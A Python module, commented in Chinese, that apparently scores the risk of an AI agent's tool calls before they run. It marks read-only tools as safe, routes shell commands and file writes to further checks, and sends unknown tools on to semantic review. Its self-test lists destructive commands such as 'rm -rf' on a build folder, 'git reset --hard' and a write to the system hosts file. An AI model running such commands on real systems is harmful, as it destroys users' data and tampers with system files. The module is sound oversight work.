# ══════════════════════════════════════════════════════════════════════
#  统一入口
# ══════════════════════════════════════════════════════════════════════

# 只读工具：无副作用，风险 0，不进入任何后续检查
READ_ONLY_TOOLS = frozenset({
    "Read", "Grep", "Glob", "WebSearch", "WebFetch", "TaskOutput", "TaskGet",
    "TaskList", "ToolSearch", "read_me", "AskUserQuestion", "show_widget",
    "present_files", "DeferExecuteTool",
})

# 写操作但主要体现在任务状态上，风险极低
LOW_TOOLS = frozenset({"TaskCreate", "TaskUpdate", "TaskStop", "Skill"})


def tool_risk(tool: str, args: Dict) -> Tuple[Optional[float], str]:
    """统一风险判定入口。

    Returns:
        (风险分, 理由)。风险分为 None 表示**规则不认识这个工具**，
        按 fail-closed 原则必须下沉到语义判断。
    """
    if tool in READ_ONLY_TOOLS:
        return 0.0, f"{tool} 是只读工具"

    if tool in LOW_TOOLS:
        return 0.05, f"{tool} 仅影响任务状态"

    if tool in ("Bash", "PowerShell"):
        return command_risk(str(args.get("command", "")))

    if tool in ("Edit", "Write", "NotebookEdit"):
        return path_risk(str(args.get("file_path", "") or args.get("path", "")))

    # 不认识的工具：fail-closed
    return None, f"{tool} 不在真实工具规则表内，需语义判断"


def risk_band(score: float) -> str:
    """风险分 → 档位。与 fixture 用同一套阈值，便于对照。"""
    if score >= 0.75:
        return "high"
    if score >= 0.35:
        return "medium"
    return "low"


if __name__ == "__main__":
    # 自检：拿几条真实日志里的命令过一遍
    cases = [
        ("Bash", {"command": "ls -la /d/my-project"}),
        ("Bash", {"command": 'cd "D:/x" && git clone --depth 1 https://github.com/a/b.git'}),
        ("Bash", {"command": "rm -rf /d/tmp/build"}),
        ("Bash", {"command": "git reset --hard origin/main"}),
        ("Bash", {"command": "git push origin main"}),
        ("Bash", {"command": 'grep -rn "rm -rf" .'}),          # 预期误报
        ("Bash", {"command": 'echo "rm -rf / would be bad"'}),  # 预期误报
        ("PowerShell", {"command": "Get-Process node | Format-List"}),
        ("Write", {"file_path": "D:/my-project/x.py"}),
        ("Write", {"file_path": "C:/Windows/System32/drivers/etc/hosts"}),
        ("Edit", {"file_path": "C:/Users/alice/Documents/note.md"}),
        ("UnknownTool", {"x": 1}),
    ]
    for tool, args in cases:
        score, why = tool_risk(tool, args)
        band = risk_band(score) if score is not None else "→ 下沉"
        preview = str(args.get("command", args.get("file_path", "")))[:52]
        print(f"{str(score):>5} {band:<8} {tool:<12} {preview:<54} {why}")
